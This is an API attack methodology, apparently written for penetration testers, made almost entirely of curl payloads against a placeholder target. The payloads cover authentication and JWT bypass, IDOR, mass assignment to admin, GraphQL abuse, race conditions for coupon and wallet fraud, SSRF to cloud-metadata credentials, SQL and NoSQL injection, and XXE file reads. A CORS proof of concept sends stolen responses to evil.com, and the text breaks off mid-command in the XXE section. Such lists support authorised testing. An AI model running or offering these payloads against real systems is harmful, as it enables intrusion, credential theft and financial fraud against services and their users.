# API Testing Rules — Comprehensive Methodology

## Table of Contents

1. [REST API Testing Fundamentals](#1-rest-api-testing-fundamentals)
2. [Parameter Manipulation](#2-parameter-manipulation)
3. [HTTP Method Override](#3-http-method-override)
4. [Content-Type Switching](#4-content-type-switching)
5. [Authentication Testing](#5-authentication-testing)
6. [API Version Diffing](#6-api-version-diffing)
7. [IDOR on CRUD Operations](#7-idor-on-crud-operations)
8. [Mass Assignment](#8-mass-assignment)
9. [GraphQL Testing](#9-graphql-testing)
10. [API Fuzzing](#10-api-fuzzing)
11. [CORS Testing](#11-cors-testing)
12. [Rate Limit Testing](#12-rate-limit-testing)
13. [API Documentation Discovery](#13-api-documentation-discovery)
14. [Error Handling Analysis](#14-error-handling-analysis)
15. [JWT Token Testing](#15-jwt-token-testing)
16. [Business Logic Flaws](#16-business-logic-flaws)
17. [Server-Side Request Forgery](#17-server-side-request-forgery)
18. [SQL Injection via API](#18-sql-injection-via-api)
19. [NoSQL Injection](#19-nosql-injection)
20. [XML External Entities](#20-xml-external-entities)
21. [Path Traversal](#21-path-traversal)
22. [Insecure Direct Object References Advanced](#22-insecure-direct-object-references-advanced)
23. [API Key Leakage](#23-api-key-leakage)
24. [WebSocket API Testing](#24-websocket-api-testing)
25. [File Upload via API](#25-file-upload-via-api)

---

## 1. REST API Testing Fundamentals

Test every endpoint: `Method: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD`, `Headers: Content-Type, Accept, Authorization, X-API-Key, Origin`, `Params: Query string, Path params, Body, Headers`, `Auth: None, Token, Basic, OAuth, API Key, Cookie`.

```bash
curl -s "https://api.target.com/v1/users" -H "Authorization: Bearer $TOKEN" | jq .
```

**Status Codes:** `200` Success, `201` Created, `204` No Content, `301/302` Redirect (follow), `400` Bad Request, `401` Unauthorized, `403` Forbidden, `404` Not Found, `405` Method Not Allowed, `429` Rate Limited, `500` Stack trace leak, `502/503` Infra exposure.

---

## 2. Parameter Manipulation

```bash
# Query string: negative, overflow, string, null byte, SQLi, NoSQL, array
curl -s "https://api.target.com/api/users?limit=-1&offset=0"
curl -s "https://api.target.com/api/users?limit=9999999999&offset=0"
curl -s "https://api.target.com/api/users?limit=abc&offset=def"
curl -s "https://api.target.com/api/users?limit=10%00&offset=0"
curl -s "https://api.target.com/api/users?limit=10' OR '1'='1&offset=0"
curl -s 'https://api.target.com/api/users?limit=10&offset[$gt]=0'
curl -s "https://api.target.com/api/users?id[]=1&id[]=2"

# Path params: traversal, type confusion, array, wildcard
curl -s "https://api.target.com/api/users/../admin"
curl -s "https://api.target.com/api/users/null"
curl -s "https://api.target.com/api/users/NaN"
curl -s "https://api.target.com/api/users/0"
curl -s "https://api.target.com/api/users/-1"
curl -s "https://api.target.com/api/users/1,2,3"
curl -s "https://api.target.com/api/users/*"

# POST body: extra fields, null, empty strings, duplicate keys, nested objects
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"name":"test","email":"test@test.com","role":"user","is_admin":true}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -d '{"name":null,"email":null,"role":""}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -d '{"name":"test","name":"admin","email":"test@test.com"}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -d '{"name":{"$ne":""},"email":"test@test.com"}'
```

---

## 3. HTTP Method Override

```bash
# Override headers
curl -s -X GET "https://api.target.com/api/users/1" -H "X-HTTP-Method-Override: DELETE" -H "Authorization: Bearer $TOKEN"
curl -s -X GET "https://api.target.com/api/users/1" -H "X-HTTP-Method: DELETE"
curl -s -X GET "https://api.target.com/api/users/1" -H "X-Method-Override: DELETE"

# URL param / form / JSON override
curl -s "https://api.target.com/api/users/1?_method=DELETE"
curl -s -X POST "https://api.target.com/api/users/1" -H "Content-Type: application/x-www-form-urlencoded" -d "_method=DELETE"
curl -s -X POST "https://api.target.com/api/users/1" -H "Content-Type: application/json" -d '{"_method":"DELETE"}'

# Verb tampering — try all methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  curl -s -X $method "https://api.target.com/api/admin/users" -H "Authorization: Bearer $TOKEN" -w "\n$method: %{http_code}\n"
done

# TRACE (may echo headers for XST)
curl -s -X TRACE "https://api.target.com/api/" -H "Authorization: Bearer $TOKEN" -H "X-Custom: test"
curl -s -X CONNECT "https://api.target.com:443" -H "Host: internal-server:8080"
```

---

## 4. Content-Type Switching

```bash
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -d '{"name":"test","email":"test@test.com"}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/xml" -d '<user><name>test</name><email>test@test.com</email></user>'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/x-www-form-urlencoded" -d "name=test&email=test@test.com"
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: text/plain" -d '{"name":"test"}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: multipart/form-data" -F "name=test" -F "email=test@test.com"

# WAF bypass via content-type switching
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -d '{"name":"<script>alert(1)</script>"}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/xml" -d '<user><name><![CDATA[<script>alert(1)</script>]]></name></user>'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/x-www-form-urlencoded" -d '{"name":"test","role":"admin"}'

# Accept header manipulation
curl -s "https://api.target.com/api/users/1" -H "Accept: text/csv" -H "Authorization: Bearer $TOKEN"
curl -s "https://api.target.com/api/users/1" -H "Accept: */*"
```

---

## 5. Authentication Testing

```bash
# Bypass attempts
curl -s "https://api.target.com/api/admin/users"  # no auth
curl -s "https://api.target.com/api/admin/users" -H "Authorization: Bearer null"
curl -s "https://api.target.com/api/admin/users" -H "Authorization: Bearer invalid"
curl -s "https://api.target.com/api/admin/users?token=$TOKEN"
curl -s "https://api.target.com/api/admin/users" -H "X-API-Key: $TOKEN"
curl -s "https://api.target.com/api/admin/users" -H "X-Forwarded-User: admin"
curl -s "https://api.target.com/api/admin/users" -H "Cookie: session=admin; auth=true; admin=true"

# Test each endpoint with and without auth
for ep in "GET:https://api.target.com/api/users" "GET:https://api.target.com/api/users/1" "POST:https://api.target.com/api/users" "DELETE:https://api.target.com/api/users/1" "GET:https://api.target.com/api/admin/users" "GET:https://api.target.com/api/settings" "GET:https://api.target.com/api/config" "GET:https://api.target.com/api/health"; do
  m="${ep%%:*}"; u="${ep#*:}"
  echo "=== No Auth: $m $u ==="; curl -s -X "$m" "$u" -w "\nHTTP: %{http_code}\n"
  echo "=== With Auth: $m $u ==="; curl -s -X "$m" "$u" -H "Authorization: Bearer $TOKEN" -w "\nHTTP: %{http_code}\n"
done

# Token handling
curl -s "https://api.target.com/api/users" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MTYyMzkwMjJ9.abc123"  # expired
curl -s "https://api.target.com/api/admin/users" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."  # alg none
```

---

## 6. API Version Diffing

```bash
for v in v1 v2 v3 v1.1 v2.1 v3.0 api latest stable beta alpha dev; do
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/$v/users"
done
curl -s "https://api.target.com/api/users" -H "Accept-Version: v1"
curl -s "https://api.target.com/api/users?version=1"
curl -s "https://api.target.com/api/users" -H "Accept: application/vnd.target.v1+json"

# Diff v1 vs v2
r1=$(curl -s -H "Authorization: Bearer $TOKEN" "https://api.target.com/v1/users/1")
r2=$(curl -s -H "Authorization: Bearer $TOKEN" "https://api.target.com/v2/users/1")
echo "$r1" | jq 'keys' | sort > /tmp/v1.txt; echo "$r2" | jq 'keys' | sort > /tmp/v2.txt; diff /tmp/v1.txt /tmp/v2.txt

# Auth/rate-limit differences between versions
curl -s "https://api.target.com/v1/admin/users"
curl -s "https://api.target.com/v2/admin/users"
```

---

## 7. IDOR on CRUD Operations

```bash
# Sequential ID enumeration
for id in 1 2 3 4 5 10 100 1000 -1 0; do
  curl -s "https://api.target.com/api/users/$id" -H "Authorization: Bearer $TOKEN" -w "\nID $id: %{http_code}\n"
done

# Cross-resource IDOR (User A's token accessing User B)
curl -s "https://api.target.com/api/users/$USER_B_ID/profile" -H "Authorization: Bearer $USER_A_TOKEN"
curl -s "https://api.target.com/api/users/$USER_B_ID/orders" -H "Authorization: Bearer $USER_A_TOKEN"
curl -s "https://api.target.com/api/users/$USER_B_ID/payment-methods" -H "Authorization: Bearer $USER_A_TOKEN"

# CRUD operations on another user's resource
curl -s "https://api.target.com/api/orders/101" -H "Authorization: Bearer $USER_A_TOKEN"  # GET
curl -s -X POST "https://api.target.com/api/orders" -H "Content-Type: application/json" -H "Authorization: Bearer $USER_A_TOKEN" -d '{"user_id":5}'  # POST
curl -s -X PUT "https://api.target.com/api/orders/101" -H "Content-Type: application/json" -H "Authorization: Bearer $USER_A_TOKEN" -d '{"status":"cancelled"}'  # PUT
curl -s -X DELETE "https://api.target.com/api/orders/101" -H "Authorization: Bearer $USER_A_TOKEN"  # DELETE

# Indirect references
curl -s "https://api.target.com/api/users?email=admin@target.com" -H "Authorization: Bearer $USER_A_TOKEN"
curl -s "https://api.target.com/api/documents?owner_id=1" -H "Authorization: Bearer $USER_A_TOKEN"

# Methodology: Register User A+B, A creates resources, capture IDs, use B's token to access A's resources
```

---

## 8. Mass Assignment

```bash
# Registration
curl -s -X POST "https://api.target.com/api/auth/register" -H "Content-Type: application/json" \
  -d '{"name":"attacker","email":"a@t.com","password":"Pass123!","role":"admin","is_admin":true,"is_verified":true,"credit":999999,"balance":999999,"tier":"premium","permissions":["read","write","delete","admin"]}'

# Profile update
curl -s -X PUT "https://api.target.com/api/users/me" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"role":"admin","is_admin":true,"credit":999999,"bypass_2fa":true,"mfa_disabled":true,"locked_at":null,"banned_until":null}'

# Common fields to try
for field in is_admin role permissions credit balance tier bypass_2fa mfa_disabled locked deleted; do
  curl -s -X PATCH "https://api.target.com/api/users/me" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d "{\"$field\":true}" | jq '.'
done

# Nested assignment
curl -s -X PUT "https://api.target.com/api/users/me" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"profile":{"role":"admin","settings":{"admin_access":true}},"account":{"type":"admin","tier":"enterprise"}}'
```

---

## 9. GraphQL Testing

```bash
# Introspection
curl -s -X POST "https://api.target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name kind } } } } }"}'

# Field probing
for field in users user admin config settings profile orders payment; do
  curl -s -X POST "https://api.target.com/graphql" -H "Content-Type: application/json" -d "{\"query\":\"{ $field { id } }\"}" | jq '.'
done

# Depth attack
d="{"; for i in $(seq 1 100); do d+="a$i {"; done; d+="id"; for i in $(seq 1 100); do d+="}"; done; d+="}"
curl -s -X POST "https://api.target.com/graphql" -H "Content-Type: application/json" -d "{\"query\":\"$d\"}"

# Batch queries (rate limit bypass)
curl -s -X POST "https://api.target.com/graphql" -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},{"query":"{ user(id:3) { email } }"}]'

# Auth on mutations
curl -s -X POST "https://api.target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id: 1) { success } }"}'
curl -s -X POST "https://api.target.com/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { updateUserRole(id: 1, role: admin) { id role } }"}'

# Direct field access
curl -s -X POST "https://api.target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email password passwordHash secret api_key } }"}'

# Batch rate limit bypass
q="["; for i in $(seq 1 50); do [ $i -gt 1 ] && q+=","; q+="{\"query\":\"{ user(id:$i) { id email } }\"}"; done; q+="]"
curl -s -X POST "https://api.target.com/graphql" -H "Content-Type: application/json" -d "$q"
```

---

## 10. API Fuzzing

```bash
# Parameter type fuzzing
for val in null undefined 0 -1 1 9999999999999 NaN inf "" " " "{}" "[]" ";"; do
  curl -s "https://api.target.com/api/users?limit=$val" -H "Authorization: Bearer $TOKEN" -w "\n-> %{http_code}\n"
done
for val in "" " " "\t" "\n" null undefined "'" "\"" "<script>alert(1)</script>" "{{7*7}}" "..%2F"; do
  curl -s "https://api.target.com/api/users?name=$val" -H "Authorization: Bearer $TOKEN" -w "\n-> %{http_code}\n"
done

# Boundary
for len in 0 1 10 100 255 256 1000 4096 65535 65536; do
  p=$(python3 -c "print('A'*$len)")
  curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d "{\"name\":\"$p\",\"email\":\"t@t.com\"}" -w "\n$len -> %{http_code}\n"
done

# Type confusion
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"name":["admin","user"],"email":"t@t.com"}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"roles":"admin,user","name":"test"}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"name":{"first":"admin"},"email":"t@t.com"}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"name":12345,"email":"t@t.com"}'

# Null / special chars
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"name":null,"email":"test@test.com","role":null}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"name":"test\u0000admin","email":"test@test.com"}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"name":"test🔥admin🚀","email":"test@test.com"}'

# JSON fuzzing
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -d '{invalid}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -d '{"name":"test","email":"test@test.com",}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -d '{"__proto__":{"admin":true},"name":"test"}'

# Header fuzzing
long=$(python3 -c "print('X'*10000)")
curl -s "https://api.target.com/api/users" -H "Authorization: Bearer $TOKEN" -H "X-Large: $long" -w "\n%{http_code}\n"
curl -s "https://api.target.com/api/users" -H "Authorization: Bearer $TOKEN" -H "Authorization: Bearer FAKE_TOKEN"
curl -s "https://api.target.com/api/users" -H "Authorization: Bearer $TOKEN" -H "X-Forwarded-For: 127.0.0.1" -H "CF-Connecting-IP: 127.0.0.1"
```

---

## 11. CORS Testing

```bash
# Origin reflection
for o in "https://evil.com" "https://target.com.evil.com" "null" "file://" "http://localhost"; do
  curl -s -D - "https://api.target.com/api/users" -H "Origin: $o" -H "Authorization: Bearer $TOKEN" -o /dev/null | grep -i "access-control"
done

# Credentials + wildcard (vulnerable if ACAO:* + ACAC:true)
curl -s -D - "https://api.target.com/api/users" -H "Origin: https://evil.com" -H "Authorization: Bearer $TOKEN" -o /dev/null | grep -iE "access-control|allow-credentials"

# Preflight
curl -s -X OPTIONS "https://api.target.com/api/users" -H "Origin: https://evil.com" -H "Access-Control-Request-Method: DELETE" -D - -o /dev/null

# Exploit PoC
# <script>var x=new XMLHttpRequest();x.open('GET','https://api.target.com/api/users/1');x.withCredentials=true;x.setRequestHeader('Authorization','Bearer TOKEN');x.onload=function(){fetch('https://evil.com/exfil?d='+btoa(this.responseText))};x.send();</script>
```

---

## 12. Rate Limit Testing

```bash
# Detection
for i in $(seq 1 100); do
  s=$(curl -s -o /dev/null -w "%{http_code}" "https://api.target.com/api/users" -H "Authorization: Bearer $TOKEN")
  [ "$s" = "429" ] && echo "Rate limited at $i" && break
done
curl -s -D - "https://api.target.com/api/users" -H "Authorization: Bearer $TOKEN" -o /dev/null | grep -iE "x-rate|retry-after|429|throttle"

# IP rotation bypass
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/api/users" -H "Authorization: Bearer $TOKEN" -H "X-Forwarded-For: 192.168.1.$i"
done
curl -s "https://api.target.com/api/users" -H "Authorization: Bearer $TOKEN" -H "X-Forwarded-For: 127.0.0.1, 10.0.0.1, 192.168.1.1"

# Method/version bypass
for m in GET POST PUT PATCH DELETE; do
  for i in $(seq 1 15); do curl -s -X $m "https://api.target.com/api/users" -H "Authorization: Bearer $TOKEN" -o /dev/null -w "%{http_code}\n"; done
done
for v in v1 v2 v3 beta; do
  for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/$v/users" -H "Authorization: Bearer $TOKEN"; done
done
```

---

## 13. API Documentation Discovery

```bash
# Swagger/OpenAPI
for p in "/swagger.json" "/swagger.yaml" "/swagger-ui.html" "/api-docs" "/api-docs.json" "/v2/api-docs" "/openapi.json" "/docs" "/documentation" "/api/schema" "/spec"; do
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com$p"
done

# GraphQL endpoints
for p in "/graphql" "/gql" "/api/graphql" "/query" "/graphiql" "/playground"; do
  curl -s -X POST "https://api.target.com$p" -H "Content-Type: application/json" -d '{"query":"{ __typename }"}' -w "\n%{http_code}\n"
done

# SOAP/WSDL
for p in "/?wsdl" "/service?wsdl" "/soap" "/WebService.asmx?wsdl"; do
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com$p"
done

# Extract endpoints from docs
curl -s "https://api.target.com/swagger.json" | grep -iE "(api[_-]?key|token|secret|password|auth)"
curl -s "https://api.target.com/swagger.json" | jq '.paths | keys[] | select(contains("admin") or contains("internal"))' 2>/dev/null
```

---

## 14. Error Handling Analysis

```bash
# Trigger errors
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -d '{invalid}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"id":"abc","name":123,"email":true}'
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"role":"nonexistent_role"}'

# Stack trace leakage
for e in "https://api.target.com/api/users/0/../../../etc/passwd" "https://api.target.com/api/users/null" "https://api.target.com/api/users/%s" "https://api.target.com/api/users/%00" "https://api.target.com/api/users/.json"; do
  curl -s "$e" | grep -iE "(error|exception|trace|stack|line|file|warning|fatal|debug)"
done

# SQL error detection
for p in "'" "1' OR '1'='1" "' OR 1=1--" "' UNION SELECT 1,2,3--" "' OR SLEEP(5)--"; do
  r=$(curl -s "https://api.target.com/api/users?id=$p" -H "Authorization: Bearer $TOKEN")
  echo "$r" | grep -qiE "(SQL|syntax|mysql|postgresql|oracle|database error|unclosed quotation)" 2>/dev/null && echo "SQL Error: $p" && echo "$r" | head -3
done

# Server info leak
curl -s -D - "https://api.target.com/api/users/999999" -H "Authorization: Bearer $TOKEN" -o /dev/null | grep -iE "(server|powered-by|x-powered|x-aspnet|php|python|django|flask|node|express|nginx|apache|iis|tomcat)"

# Debug endpoints
for p in "/debug" "/api/debug" "/info" "/health" "/metrics" "/api/metrics" "/actuator" "/actuator/health" "/actuator/env" "/actuator/heapdump" "/phpinfo.php" "/server-status" "/env" "/config"; do
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com$p"
done
```

---

## 15. JWT Token Testing

```bash
# Decode
echo $TOKEN | cut -d. -f2 | python3 -c "import sys,base64,json; print(json.dumps(json.loads(base64.urlsafe_b64decode(sys.stdin.read()+'==')),indent=2))"

# alg:none attacks
curl -s "https://api.target.com/api/admin/users" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
curl -s "https://api.target.com/api/admin/users" -H "Authorization: Bearer eyJhbGciOiJOb25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
curl -s "https://api.target.com/api/admin/users" -H "Authorization: Bearer eyJhbGciOiJOT05FIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."

# Weak HMAC bruteforce
for s in secret password key admin test jwt 123456 changeme; do
  t=$(python3 -c "import jwt,time; print(jwt.encode({'sub':'1','role':'admin','iat':int(time.time())},'$s',algorithm='HS256'))")
  r=$(curl -s -o /dev/null -w "%{http_code}" "https://api.target.com/api/admin/users" -H "Authorization: Bearer $t")
  [ "$r" != "401" ] && echo "Weak secret '$s' -> HTTP $r"
done

# KID injection
hdr=$(echo -n '{"kid":"../../../etc/passwd","alg":"HS256"}' | base64 | tr -d '=' | tr '+/' '-_')
pld=$(echo -n '{"sub":"1","role":"admin","iat":1516239022}' | base64 | tr -d '=' | tr '+/' '-_')
curl -s "https://api.target.com/api/admin/users" -H "Authorization: Bearer $hdr.$pld."
hdr=$(echo -n '{"kid":"/dev/null","alg":"HS256"}' | base64 | tr -d '=' | tr '+/' '-_')
curl -s "https://api.target.com/api/admin/users" -H "Authorization: Bearer $hdr.$pld."

# Expiration
curl -s "https://api.target.com/api/users" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE1MTYyMzkwMjJ9.SIG"
noh=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
nop=$(echo -n '{"sub":"1","role":"admin","iat":1516239022}' | base64 | tr -d '=' | tr '+/' '-_')
curl -s "https://api.target.com/api/admin/users" -H "Authorization: Bearer $noh.$nop.SIG"
```

---

## 16. Business Logic Flaws

```bash
# Race conditions
for i in $(seq 1 20); do
  curl -s -X POST "https://api.target.com/api/coupons/redeem" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"code":"SINGLE_USE"}' -w "\n$i: %{http_code}\n" &
done; wait
for i in $(seq 1 10); do
  curl -s -X POST "https://api.target.com/api/wallet/transfer" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"to":"attacker","amount":100}' -w "\n$i: %{http_code}\n" &
done; wait

# Integer overflow
curl -s -X POST "https://api.target.com/api/cart/add" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"product_id":1,"quantity":9999999999999999999999999999999}'
curl -s -X POST "https://api.target.com/api/cart/add" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"product_id":1,"quantity":-1}'
curl -s -X POST "https://api.target.com/api/cart/checkout" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"items":[{"id":1,"price":-999999}]}'

# Coupon abuse
for i in $(seq 1 10); do curl -s -X POST "https://api.target.com/api/checkout/apply-coupon" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"code":"WELCOME10"}'; done
curl -s -X POST "https://api.target.com/api/checkout/apply-coupon" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"code":"WELCOME10&FREESHIPPING"}'

# Order manipulation
curl -s -X PATCH "https://api.target.com/api/orders/101" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"total":0.01,"status":"paid"}'
curl -s -X PUT "https://api.target.com/api/cart/item/1" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"price":0.01}'

# Registration abuse
for i in $(seq 1 100); do curl -s -X POST "https://api.target.com/api/auth/register" -H "Content-Type: application/json" -d "{\"name\":\"u$i\",\"email\":\"u$i@t.com\",\"password\":\"Pass123!\"}" & done; wait

# Privilege escalation
curl -s -X PUT "https://api.target.com/api/users/me/role" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"role":"admin"}'
curl -s -X PATCH "https://api.target.com/api/users/me" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"role_id":1}'
```

---

## 17. Server-Side Request Forgery

```bash
# URL param fuzzing
for p in url uri dest redirect return callback next target webhook src source image_url file download_url; do
  curl -s "https://api.target.com/api/function?$p=http://127.0.0.1:8080" -H "Authorization: Bearer $TOKEN" -w "\n$p: %{http_code}\n"
done

# Internal targets
for ip in "127.0.0.1" "localhost" "0.0.0.0" "10.0.0.1" "172.16.0.1" "192.168.1.1" "169.254.169.254"; do
  curl -s "https://api.target.com/api/fetch?url=http://$ip" -H "Authorization: Bearer $TOKEN" -w "\n$ip: %{http_code}\n"
done

# Bypass techniques
curl -s "https://api.target.com/api/fetch?url=http://evil.com@127.0.0.1:8080/admin"
curl -s "https://api.target.com/api/fetch?url=http://2130706433:8080"
curl -s "https://api.target.com/api/fetch?url=http://0x7f000001:8080"
curl -s "https://api.target.com/api/fetch?url=http://[::1]:8080"
curl -s "https://api.target.com/api/fetch?url=http://7f000001.7f000001.nip.io:8080"

# Cloud metadata
curl -s "https://api.target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://api.target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "https://api.target.com/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s "https://api.target.com/api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Protocol handlers
curl -s "https://api.target.com/api/fetch?url=file:///etc/passwd"
curl -s "https://api.target.com/api/fetch?url=file:///c:/windows/win.ini"
curl -s "https://api.target.com/api/fetch?url=dict://127.0.0.1:6379/info"
curl -s "https://api.target.com/api/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a"
curl -s "https://api.target.com/api/fetch?url=ftp://127.0.0.1:21"
curl -s "https://api.target.com/api/fetch?url=ldap://127.0.0.1:389"
```

---

## 18. SQL Injection via API

```bash
# Parameter-based
curl -s "https://api.target.com/api/users?id=1' OR '1'='1"
curl -s "https://api.target.com/api/users?id=1' UNION SELECT 1,2,3--"
curl -s "https://api.target.com/api/users?id=1' OR SLEEP(5)--"
curl -s "https://api.target.com/api/users?id=1' WAITFOR DELAY '0:0:5'--"
curl -s "https://api.target.com/api/users?id=1' AND 1=1--"
curl -s "https://api.target.com/api/users?id=1' AND 1=2--"

# Body-based
curl -s -X POST "https://api.target.com/api/users/search" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"name":"test'"'"' OR '"'"'1'"'"'='"'"'1"}'
curl -s -X POST "https://api.target.com/api/users/search" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"name":{"search":"'"'"' OR 1=1--"}}'

# Header-based
curl -s "https://api.target.com/api/users" -H "Authorization: Bearer $TOKEN' OR '1'='1"
curl -s "https://api.target.com/api/users" -H "User-Agent: ' OR 1=1--"

# Second-order SQLi
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"name":"sqli","email":"sqli'"'"'||(SELECT @@version)||'"'"'@t.com"}'
curl -s "https://api.target.com/api/users/search?email=sqli" -H "Authorization: Bearer $TOKEN"
```

---

## 19. NoSQL Injection

```bash
# MongoDB operators
curl -s 'https://api.target.com/api/users/login' -H "Content-Type: application/json" -d '{"username":{"$ne":""},"password":{"$ne":""}}'
curl -s 'https://api.target.com/api/users/login' -H "Content-Type: application/json" -d '{"username":{"$gt":""},"password":{"$gt":""}}'
curl -s 'https://api.target.com/api/users/search' -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"username":{"$regex":".*"}}'
curl -s 'https://api.target.com/api/users' -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"id":{"$in":["1","2","3"]}}'
curl -s 'https://api.target.com/api/users' -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"$where":"1==1"}'

# URL-encoded delivery
curl -s "https://api.target.com/api/users?username[\$ne]=&password[\$ne]="
curl -s 'https://api.target.com/api/auth/login' -H "Content-Type: application/json" -d '{"username":"admin","password":{"$regex":"^a"}}'

# Error detection
curl -s -X POST 'https://api.target.com/api/auth/login' -H "Content-Type: application/json" -d '{"username":{"$bad op":1},"password":"test"}'
r=$(curl -s -X POST 'https://api.target.com/api/auth/login' -H "Content-Type: application/json" -d '{"username":{"$ne":null},"password":{"$ne":null}}')
echo "$r" | grep -iE "(Mongo|MongoDB|BSON|ObjectID|MongoError)"
```

---

## 20. XML External Entities

```bash
# Basic XXE
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name><email>t@t.com</email></user>'

# SOAP XXE
curl -s -X POST "https://api.target.com/api/soap" -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><getUser><id>&xxe;</id></getUser></soap:Body></soap:Envelope>'

# Blind XXE (OOB)
curl -s -X POST "https://api.target.com/api/users" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_SERVER:PORT/xxe">%xxe;]><user><name>test</name><email>t@t.com</email></user>'

# SVG XXE
curl -s -X POST "https://api.target.com/api/upload" -H "Content-Type: image/svg+xml" -H "Authorization: Bearer $TOKEN" \
